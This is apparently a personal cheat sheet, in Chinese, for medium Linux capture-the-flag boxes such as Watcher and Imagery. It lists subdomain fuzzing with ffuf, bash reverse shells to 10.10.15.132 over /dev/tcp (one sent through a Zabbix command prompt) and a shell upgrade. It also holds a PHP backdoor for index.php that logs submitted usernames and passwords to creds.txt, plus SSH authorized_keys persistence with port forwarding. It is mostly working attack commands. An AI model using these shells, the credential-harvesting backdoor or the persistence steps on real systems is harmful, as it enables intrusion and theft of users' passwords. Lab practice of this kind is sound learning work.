## Linux_Medium
### https:// ippsec.rocks 搜索关键词漏洞 
### https://crackstation.net 解编码

#### 通过Web的404可以知道web的框架；如Flask为python;flask-unsign是用来解析Flask应用的签名cookie的
```
Google搜索：0xdf 404 templates

https://0xdf.gitlab.io/cheatsheets/404
```
```
在这种 Flask 轻量项目里，最常见几种是：  
方式	      典型文件
SQLite:	  db.sqlite3, database.db
JSON存储	: db.json, users.json, data.json
YAML:     config.yaml
```
#### 子域名爆破
```
[★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
```
#### 反弹
```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'


python3 -c 'import pty;pty.spawn("/bin/bash")'
web@Imagery:~/web$ ^Z
[1]+  Stopped                 nc -lvnp 9011
[★]$ stty raw -echo;fg
nc -lvnp 9011
             export TERM=xterm

[zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
```
#### env
```
[★]$ python3 -m venv .venv
[★]$ source .venv/bin/activate
```

#### rsa_id; index.php后门 form Watcher
```
// Backdoor 手动插入后门好酷
	  $file = fopen("creds.txt", "a+");
 	fputs($file, "Username: {$_POST['name']} | Password: {$_POST['password']}\n"); //$_POST['name'] 表单用户名
 	header("Location: http://127.0.0.1/index.php");
 	fclose($file);	  

//关于私钥
zabbix@watcher:/var/lib/zabbix$ mkdir -p /var/lib/zabbix/.ssh //-p:如果父目录不存在就一起创建
zabbix@watcher:/var/lib/zabbix$ ssh-keygen -t rsa -b 2048 -f /var/lib/zabbix/.ssh/id_rsa -N "" //-N ""空密码
zabbix@watcher:/var/lib/zabbix$ cd .ssh
zabbix@watcher:/var/lib/zabbix/.ssh$ ls
id_rsa	id_rsa.pub
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa.pub > authorized_keys //把 公钥写入授权列表
zabbix@watcher:/var/lib/zabbix/.ssh$ cat id_rsa
[★]$ vi id_rs
[★]$ chmod 600 id_rsa //-rw-------
[★]$ ssh -i id_rsa zabbix@watcher.vl -L 8111:127.0.0.1:8111 -N //-N 不执行远程命令
```
